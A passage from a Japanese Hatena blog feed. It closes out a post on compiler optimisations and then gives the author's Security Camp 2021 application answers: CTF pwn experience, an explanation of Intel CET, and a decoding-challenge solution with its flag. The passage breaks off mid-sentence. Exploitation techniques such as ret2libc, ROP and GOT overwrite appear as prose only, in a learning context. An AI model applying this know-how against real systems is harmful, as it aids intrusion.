&lt;p&gt;上の例では処理が上から下に一直線に行われる、つまり基本ブロック内で行われる最適化である。この場合、変数と値のテーブルを使うことで簡単に実装ができる。&lt;/p&gt;

&lt;p&gt;一方で複雑な制御フローが絡む大局的な定数伝播はもっと難しい。制御フローグラフの各ノードごとに変数と値のテーブルを持たせることで、効率的に行うことができる。詳しくは&lt;a href=&quot;http://pages.cs.wisc.edu/~horwitz/CS704-NOTES/2.DATAFLOW.html&quot;&gt;[ref1]&lt;/a&gt;を見てほしい。&lt;/p&gt;

&lt;h2&gt;到達不可能コードの削除&lt;/h2&gt;

&lt;p&gt;以下の変換をする最適化である。&lt;/p&gt;

&lt;p&gt;before&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;goto&lt;/span&gt; A;
a = &lt;span class=&quot;synConstant&quot;&gt;10&lt;/span&gt;;
&lt;span class=&quot;synStatement&quot;&gt;A&lt;/span&gt;:
&lt;/pre&gt;


&lt;p&gt;after&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;goto&lt;/span&gt; A;
&lt;span class=&quot;synStatement&quot;&gt;A&lt;/span&gt;:
&lt;/pre&gt;


&lt;p&gt;2行目の&lt;code&gt;a = 10&lt;/code&gt;は必ず実行されない命令(到達不可能コード)だから、削除することでバイナリのサイズを減らすことができる。もちろん、ここからさらに、&lt;code&gt;goto A; A:&lt;/code&gt;を削除することもできる。&lt;/p&gt;

&lt;h3&gt;実装&lt;/h3&gt;

&lt;p&gt;制御フローグラフの各ノードに対して、到達可能を表すboolean値を持たせる。制御フローグラフのエントリーポイントからグラフの全探索を行い、到達したノードのboolean値を
trueにする。最後にfalseなノードを削除する。&lt;/p&gt;

&lt;h2&gt;　参考&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;[1] &lt;a href=&quot;http://pages.cs.wisc.edu/~horwitz/CS704-NOTES/2.DATAFLOW.html&quot;&gt;http://pages.cs.wisc.edu/~horwitz/CS704-NOTES/2.DATAFLOW.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>          <pubDate>Sat, 20 Nov 2021 16:59:29 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/13574176438034764002</guid>
          
            <category>言語処理系</category>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/13574176438034764002/1638952823" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>セキュリティキャンプ2021応募課題</title>
          <link>https://tamaron.hatenablog.com/entry/2021/06/13/211001</link>          <description>&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BB%A5%AD%A5%E5%A5%EA%A5%C6%A5%A3%A5%AD%A5%E3%A5%F3%A5%D7&quot;&gt;セキュリティキャンプ&lt;/a&gt;全国大会2021に参加することになりました。応募用紙を書くにあたって、先人たちの応募用紙晒しが役立ったので、僕も応募課題を晒します。&lt;br&gt;
冗長なところとかは一部省略してます。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2&gt;セキュリティ・キャンプ全国大会2021 脅威解析トラック 応募課題&lt;/h2&gt;

&lt;p&gt;以下の問1～問8について、それぞれ5,000文字以内で回答してください。&lt;br&gt;
なお、正解がある設問については、&quot;正解していること&quot;よりも&quot;正解にたどり着くまでのプロセスや熱意&quot;を重要視しています。答えにたどり着くまでの試行錯誤や自分なりの工夫等を書いて、精一杯アピールしてください。&lt;br&gt;&lt;/p&gt;

&lt;h2&gt;問1&lt;/h2&gt;

&lt;p&gt;あなたがセキュリティ・キャンプ全国大会に応募する理由を教えてください。受講生や講師とのコミュニケーション、受講したい講義、なりたい自分など、何でも構いません。&lt;br&gt;
&lt;br&gt;
&amp;lt;私について&gt;&lt;br&gt;
　(略)&lt;br&gt;
&amp;lt;応募理由&gt;&lt;br&gt;
　私は&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BB%A5%AD%A5%E5%A5%EA%A5%C6%A5%A3%A5%AD%A5%E3%A5%F3%A5%D7&quot;&gt;セキュリティキャンプ&lt;/a&gt;に参加したい一番の理由は、低レイヤの理解を深めつつ、自分の知らない分野にも手を広げたいからです。&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BB%A5%AD%A5%E5%A5%EA%A5%C6%A5%A3%A5%AD%A5%E3%A5%F3%A5%D7&quot;&gt;セキュリティキャンプ&lt;/a&gt;の各トラックの説明を眺める中、脅威解析トラックに目が止まり、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DE%A5%EB%A5%A6%A5%A7%A5%A2&quot;&gt;マルウェア&lt;/a&gt;がネットワーク、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;、OSなど色んな技術と深く関わりをもつことを知りました。先に述べたように、私は偶然セキュリティという分野にであって興味をもちました。そのため、全く知らない&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DE%A5%EB%A5%A6%A5%A7%A5%A2&quot;&gt;マルウェア&lt;/a&gt;の分野について学ぶことで、他の分野に興味が向き、コンピュータをもっと深く理解することができると思います。また、自分の知らない分野を得意としている人たちと繋がり、人脈を広げたいです。&lt;br&gt;
&lt;br&gt;
&amp;lt;とくに受講したい講義&gt;&lt;br&gt;
　正直なところすべての講義がとても楽しそうですが、特に、「C2 痕跡から手がかりを集める - &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A1%BC%A5%C6%A5%A3%A5%D5%A5%A1%A5%AF%A5%C8&quot;&gt;アーティファクト&lt;/a&gt;の発見/分析技術」に参加したいです。坂井さんのバイナリかるたで、ビットマップの色とフォーマットに視覚的な関係があることを知ったり、また、問7で調べた&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/NTFS&quot;&gt;NTFS&lt;/a&gt;フォーマットのような&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D5%A5%A1%A5%A4%A5%EB%A5%B7%A5%B9%A5%C6%A5%E0&quot;&gt;ファイルシステム&lt;/a&gt;の仕組みを調べる中でバイナリやファイルフォーマットに興味を持ちました。この講義では、フォーマットについてより深い知識を得ることに加えて、犯罪操作などに使われる実践的なデジタル&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D5%A5%A9%A5%EC%A5%F3%A5%B8%A5%C3%A5%AF&quot;&gt;フォレンジック&lt;/a&gt;スの手法を学ぶことができると思うので、参加することができれば、とても楽しみです。&lt;br&gt;&lt;/p&gt;

&lt;h2&gt;問2&lt;/h2&gt;

&lt;p&gt;今までに解析したことのあるソフトウェアやハードウェアにはどのようなものがありますか？解析の目的や解析方法、結果として得られた知見などを含めて教えてください。&lt;br&gt;
&lt;br&gt;
　CTFのpwnを勉強しており、ELFファイルを&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C7%A5%D0%A5%C3%A5%B0&quot;&gt;デバッグ&lt;/a&gt;した経験があります。&lt;br&gt;
　pwnは実行プログラムの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD&quot;&gt;脆弱性&lt;/a&gt;を発見して、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9&quot;&gt;ペイロード&lt;/a&gt;を送り込み、シェルを奪うことを目指す競技です。私は、ROP emporiumというサイトでpwnの基本的なテクニックを学びました。(いくつかの問題のwriteupは私のhatenablogにあります。)pwnの問題を解く時は静的解析→動的解析の順で行います。静的解析は主にstringやfileコマンドを用います。例えばstringコマンドでbin/lsがヒットすれば、内部でsystem(“/bin/ls”)を実行していることがわかります。問題によってはlibcが与えられる場合もあり、libc上system()のオフセットを用いて、ret2libcでシェルを奪うこともありました。動的解析は普段は&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/gdb&quot;&gt;gdb&lt;/a&gt;-pedaを使って行います。実行して&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;やメモリの値を追うことはもちろん、関数を逆&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EB&quot;&gt;アセンブル&lt;/a&gt;して、処理の内容を予測したり、ROP gadgetを検索し、ROPを組み立てたりします。ROP emporiumではスタック&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/BOF&quot;&gt;BOF&lt;/a&gt;を起点とする攻撃が中心でした。&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DA%A5%A4%A5%ED%A1%BC%A5%C9&quot;&gt;ペイロード&lt;/a&gt;を作るときは、スタックの挙動を考えながら作ります。個人的にはStack Pivotが斬新でとても楽しかったです。また、攻撃手法だけでなくNX bitやRELROなどのセキュリティ機構についても学びました。例えばNX bitがオンの時はシェルコードを送り込むことはできません。RELROがNo RELROまたはPartial RELROのときは、.got.pltセクションを書き換えることで、RIPを奪うことができます。&lt;br&gt;&lt;/p&gt;

&lt;h2&gt;問3&lt;/h2&gt;

&lt;p&gt;今までに作成したソフトウェアやハードウェアにはどのようなものがありますか？&lt;br&gt;
どんな言語やライブラリ、パーツを使って作ったのか、どこにこだわって作ったのか、などたくさん自慢してください。&lt;br&gt;
&lt;br&gt;
(0)自分のサイト&lt;br&gt;
&lt;a href=&quot;https://tamaroning.github.io/&quot;&gt;https://tamaroning.github.io/&lt;/a&gt; &lt;br&gt;
HTMLと&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/CSS&quot;&gt;CSS&lt;/a&gt;でライブラリを使わずに作りました。特に工夫した点はないですが、デザインは&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D5%A5%E9%A5%C3%A5%C8%A5%C7%A5%B6%A5%A4%A5%F3&quot;&gt;フラットデザイン&lt;/a&gt;を参考にして、コンパクトに作りました。&lt;br&gt;
&lt;br&gt;
(1)小さなプログラム&lt;br&gt;
(1-a)&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B7%A5%E5%A1%BC%A5%C6%A5%A3%A5%F3%A5%B0%A5%B2%A1%BC%A5%E0&quot;&gt;シューティングゲーム&lt;/a&gt;&lt;br&gt;
(略)&lt;br&gt;
&lt;br&gt;
(1-b)&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Twitter&quot;&gt;Twitter&lt;/a&gt;の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/bot&quot;&gt;bot&lt;/a&gt;&lt;br&gt;
(略)&lt;br&gt;
&lt;br&gt;
(1-c)LINE &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/bot&quot;&gt;bot&lt;/a&gt;&lt;br&gt;
(略)&lt;br&gt;
&lt;br&gt;
(1-d)離散&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D5%A1%BC%A5%EA%A5%A8%CA%D1%B4%B9&quot;&gt;フーリエ変換&lt;/a&gt;を用いたグラフ描画ソフト&lt;br&gt;
デモ動画:&lt;/p&gt;

&lt;p&gt;&lt;iframe width=&quot;420&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/yqOQUfqhF34?feature=oembed&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=yqOQUfqhF34&quot;&gt;www.youtube.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;　高校2年の時、Processingで実装しました。動画のように、円盤を重ねて絵を描く動画をみたことがあり、どうやったら実装できるか勉強しました。このプログラムではまず、連続的な二次元の曲線を用意して、それを一つの変数についての媒介変数表示にします。さらに時間について&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D5%A1%BC%A5%EA%A5%A8%CA%D1%B4%B9&quot;&gt;フーリエ変換&lt;/a&gt;することで、各円盤の半径が得られるという仕組みになっています。動画では&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%DC%A5%EA%A5%E5%A1%BC%A5%C8%B6%CA%C0%FE&quot;&gt;インボリュート曲線&lt;/a&gt;という円に紐を巻き付けたときにできる曲線を描いてみました。&lt;br&gt;
&lt;br&gt;
(1-e)セル&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AA%A1%BC%A5%C8%A5%DE%A5%C8%A5%F3&quot;&gt;オートマトン&lt;/a&gt;による雪の結晶&lt;br&gt;
デモ動画:&lt;/p&gt;

&lt;p&gt;&lt;iframe width=&quot;420&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/mbfI-kajQ1U?feature=oembed&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=mbfI-kajQ1U&quot;&gt;www.youtube.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;　高校3年生Processingで実装しました。セル&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AA%A1%BC%A5%C8%A5%DE%A5%C8%A5%F3&quot;&gt;オートマトン&lt;/a&gt;とは&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%E9%A5%A4%A5%D5%A5%B2%A1%BC%A5%E0&quot;&gt;ライフゲーム&lt;/a&gt;のように、マスで区切られた空間にルールを与えて、空間全体の時間発展を観察するものです。&lt;br&gt;
このプログラムでは六角形のセルで雪の結晶の角(腕)の成長を再現しました。雪の結晶の成長を単純に再現しようとすると、雪のマスを1、雪のないマスを0で表現して、「隣接マスのうちKマス以上が1なら、次の世代でそのマスは1になる」というルールを作ればいいと思うのが普通だと思います。しかし、実はその方法だときめ細やかに成長する雪の結晶の角は再現できません。&lt;br&gt;
例えば、&lt;br&gt;
&lt;a href=&quot;https://www.youtube.com/watch?v=jl5Yh4Kc5v0&quot;&gt;https://www.youtube.com/watch?v=jl5Yh4Kc5v0&lt;/a&gt; &lt;br&gt;
上の動画でみられる結晶は1か0の表現を用いており、結晶の成長が単純、ワンパターンだと思います。そこで、論文や書籍を漁り、きめ細やかな角を作る方法を模索しました。セルの状態を1か0ではなく、0から1の実数値で表し、外部の気温の影響によって全てのセルの数値が徐々に変化する場を用意することで、美しい結晶の成長を実現しました。実際、この方法は現実の結晶の成長により近いと思います。&lt;br&gt;
&lt;br&gt;
(2)パズルゲーム&lt;br&gt;
(略)&lt;br&gt;
&lt;br&gt;
(3)自作&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/x86&quot;&gt;x86&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%DF%A5%E5%A5%EC%A1%BC%A5%BF&quot;&gt;エミュレータ&lt;/a&gt;&lt;br&gt;
(略)&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h2&gt;問4&lt;/h2&gt;

&lt;p&gt;ここ数年に発表された、以下のキーワードに関連するニュースや記事や学術論文から1つ選び、それに関して調べた内容を記述してください。内容には、1.選んだ理由、2.技術的詳細、3.被害規模または影響範囲、4.対策、の4点を必ず含めてください。なお、対策は今ある技術のみに捕われず、将来的な技術や法律など、自由な発想で書いてください。&lt;br&gt;
キーワード：
- サイバー&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BB%A5%AD%A5%E5%A5%EA%A5%C6%A5%A3%A5%A4%A5%F3%A5%B7%A5%C7%A5%F3%A5%C8&quot;&gt;セキュリティインシデント&lt;/a&gt;
- &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DE%A5%EB%A5%A6%A5%A7%A5%A2&quot;&gt;マルウェア&lt;/a&gt;
- 攻撃キャンペーン
- &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD&quot;&gt;脆弱性&lt;/a&gt;
- 新たな攻撃手法
- 未知の脅威
- 組み込みシステム&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;選んだ記事&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;“Control-flow Enforcement Technology &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Preview&quot;&gt;Preview&lt;/a&gt;”, &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Intel&quot;&gt;Intel&lt;/a&gt; Developer Zone &lt;br&gt;
&lt;a href=&quot;https://binpwn.com/papers/control-flow-enforcement-technology-preview.pdf&quot;&gt;https://binpwn.com/papers/control-flow-enforcement-technology-preview.pdf&lt;/a&gt; &lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;1.  選んだ理由 &lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　問3を書いている時に、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Intel&quot;&gt;Intel&lt;/a&gt; Developer Zoneの”A Technical Look at &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Intel&quot;&gt;Intel&lt;/a&gt;’s Control-flow Enforcement Technology”という記事を見つけ、隠しスタック以外のIndirect branch trackingという機能があることを知り興味を持ったため。また、自分の実装した単純な隠しスタックとCETのShadow Stackの相違点を知りたいと思ったから。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;2. 技術的詳細&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　Control-flow Enforcement Technology(CET)は以下の二つの機能をもつ。&lt;br&gt;
・Shadow Stack: リターンアドレスを保護する&lt;br&gt;
・Indirect branch tracking: 間接ジャンプを保護する&lt;br&gt;
以下ではこの二つの機能についてマニュアルで得られた知識をもとに説明する。&lt;br&gt;
&lt;br&gt;
2-1. Shadow Stack&lt;br&gt;
(a)概要&lt;br&gt;
　Shadow Stackはデータスタックとは別のリターンアドレスを保持しておくスタックである。まず、call命令実行時、データスタックとコールスタックの両方にリターンアドレスがプッシュされる。ret命令実行時、データスタックとコールスタックからそれぞれポップし、両者を比較する。もし相異なれば、制御保護例外シグナル(#CP)を発する。Shadow Stackのデータ領域はページテーブルによって’Shadow Stack’の属性が付与され、MOVなどのストア命令によって改竄されることはない。Shadow Stackをオーバーフロー、アンダーフローさせることはできない。さらに、新たな&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;として&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/SSP&quot;&gt;SSP&lt;/a&gt;(Shadow Stack Pointer)&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;がサポートされる。&lt;br&gt;
&lt;br&gt;
　Far CALLとFar RETはコードセグメント間の異なる処理の呼び出しに使われである。これらの命令時、リターンアドレスに加えてCSと&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/SSP&quot;&gt;SSP&lt;/a&gt;がShadow Stackにプッシュ、ポップされる。異なる権限間のFar CALLではsupervisor shadow tokenの正当性の確認が行われる。また、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/CPL&quot;&gt;CPL&lt;/a&gt;=3と&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/CPL&quot;&gt;CPL&lt;/a&gt;&amp;lt;3の間の遷移はMSRと呼ばれるスタックに&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/SSP&quot;&gt;SSP&lt;/a&gt;をプッシュ、ポップする。&lt;br&gt;
&lt;br&gt;
(b)Shadow Stackの切り替え&lt;br&gt;
　RSTORSSPとSAVEPREVSSPという2つの命令が用いられる。&lt;br&gt;
　RSTORSSPはコンテキストの退避処理である。新たなShadow Stackを作成するとき、shadow stack restore tokenがプッシュされる。この&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ンには以前のShadow Stackの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/SSP&quot;&gt;SSP&lt;/a&gt;などが格納される。&lt;br&gt;
　SAVEPREVSSPはコンテキストの復元処理である。Shadow stack restore&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ンから前のShadow Stackの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/SSP&quot;&gt;SSP&lt;/a&gt;をポップする。&lt;br&gt;
&lt;br&gt;
(c)その他追加される命令&lt;br&gt;
　他に追加される命令として以下がある。&lt;br&gt;
INCSSP: &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/SSP&quot;&gt;SSP&lt;/a&gt;のインクリメント&lt;br&gt;
RDSSP: &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/SSP&quot;&gt;SSP&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;の内容を他の場所に読み込む&lt;br&gt;
WRSS/WRUSS: Shadow Stackへ書き込む&lt;br&gt;
&lt;br&gt;
2-2.Indirect Branch Tracking&lt;br&gt;
　IBTはcontrol flow hijackingを防ぐための技術である。間接分岐をマークするためにENDBRANCH命令が使われる。CET未対応のマシンではNOPとして解釈されるため、CETを利用せずとも問題なくプログラムを実行することができる。&lt;br&gt;
　jmpやcall命令実行時、ステートマシンはIDLEからWAIT_FOR_ENDBRANCHステートに切り替わる。WAIT_FOR_ENDBRANCHステートのとき、次の命令がENDBRANCHでない場合、#CP例外を発生させる。すなわち、間接分岐の分岐先アドレスが不正なアドレスに書き換えられていないかを検出することができる。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;3. 影響範囲&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　まず、わたしはCall-oriented programmingとJump-oriented programmingを知らなかったのでこれらについて調べてみた。&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Microsoft&quot;&gt;Microsoft&lt;/a&gt;の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD&quot;&gt;脆弱性&lt;/a&gt;対策ソフトEMET 3.5の根幹をなしていたROP guardという機構がある。ROP guardはCall Stackを辿ることで、不正にret命令が使われていないかチェックする。しかし、retをjmpで代用することでROP guardを回避することができる。また、COPはretやjmpの代わりにcallを用いたものである。例えば、call後にリターンアドレスをpopすることで、実質的にjmpと等価になる。&lt;br&gt;
　Indirect Branch Trackingによって、間接分岐の分岐先が不正でないかをを検出することができ、COPやJOPを防止することができる。&lt;br&gt;
　Shadow Stackは、ユーザーランドと&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AB%A1%BC%A5%CD%A5%EB&quot;&gt;カーネル&lt;/a&gt;ランドにおいてリターンアドレスの書き換えを検知する。そのため、ROP以外のリターンアドレスを書き換える攻撃、例えばret2pltなども検出することができる。&lt;br&gt;
　また、パフォーマンスのオーバヘッドはIBTはほとんど無いと言えるが、Shadow Stackの場合、例えば&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%BF%BC%A4%B5%CD%A5%C0%E8%C3%B5%BA%F7&quot;&gt;深さ優先探索&lt;/a&gt;などの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%BA%C6%B5%A2&quot;&gt;再帰&lt;/a&gt;多用するプログラムではオーバヘッドが大きいと考えられる。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;4. 対策、考察&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　上で述べたように、Shadow StackとIBTはそれぞれ、ROPとJOP/COPの対策になっている。ここで、CETがオンのときの攻撃方法について考えてみる。ROP/COP/JOPはスタック&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/BOF&quot;&gt;BOF&lt;/a&gt;などでリターンアドレスを書き換えることを攻撃の起点としている。つまり、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DE&quot;&gt;プログラマ&lt;/a&gt;が意図していないコードブロックの遷移はCETによって対策されるということである。そのため、RIPを奪うことはとても難しくなったと考えられる。一方でUse after Freeなどにより変数を書き換えることに対しては防衛策がないので、そのようなメモリの書き換えを起点とした攻撃の研究がより盛んになると思う。&lt;br&gt;&lt;/p&gt;

&lt;h2&gt;問5&lt;/h2&gt;

&lt;p&gt;ブログや &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/GitHub&quot;&gt;GitHub&lt;/a&gt; など、技術情報を公開している URL があれば教えてください。またその内容についてアピールすべきポイントがあれば記載してください。&lt;br&gt;
(略)&lt;br&gt;&lt;/p&gt;

&lt;h2&gt;問6&lt;/h2&gt;

&lt;p&gt;配布した6_decode.binは PE形式のプログラムであり、実行すると内部に保持した&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;されたデータをデコードして表示します。6_decode.binを解析し、挙動などわかったことをまとめて解析レポートを作成してください。また、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;を特定して、デコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8&quot;&gt;スクリプト&lt;/a&gt;を作成し、次のデータを復号して回答してください。&lt;br&gt;
&quot;＼x8d＼x93＼x13＼x8a＼x43＼xb6＼x59＼x4d＼x41＼x80＼x1b＼x53＼x02＼&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/x86&quot;&gt;x86&lt;/a&gt;＼xf2＼xed＼x55＼x55＼x78＼x59＼x8b＼x77＼x35＼x17＼x56&quot;&lt;br&gt;
解析が最後までできたとしても、できなかったとしても、解析の手順、解析にあたり学習したこと、解析の過程で判明したことを文字数制限の範囲で自由に記述してください。&lt;br&gt;
&lt;br&gt;
　回答は、&amp;lt;問の復号後データ&gt;、&amp;lt;解析にあたり勉強したこと&gt;、&amp;lt;解析の過程&gt;、&amp;lt;解析レポート&gt;に分割しました。&lt;br&gt;
&lt;br&gt;
&amp;lt;問の復号後データ&gt;&lt;br&gt;
　問に記載されていたデータの復号後データは&lt;br&gt;
&lt;code&gt;D1d_y0u_$01v3_C0s70m_X0r?&amp;lt;&lt;/code&gt;
です。&lt;br&gt;
&lt;br&gt;
&amp;lt;解析にあたり勉強したこと&gt;&lt;br&gt;
　私は普段&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Mac&quot;&gt;Mac&lt;/a&gt;を使っているので、問6,問7は&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Windows&quot;&gt;Windows&lt;/a&gt;をパソコンにインストールするところから始めました。&lt;br&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Windows&quot;&gt;Windows&lt;/a&gt;のx64ではr8,r9やCDQ命令、MOVSXZ命令などを知らなかったので、解析にあたり、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Windows&quot;&gt;Windows&lt;/a&gt; &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/API&quot;&gt;API&lt;/a&gt;、x64&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;、デバッガの使い方、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;と&lt;a 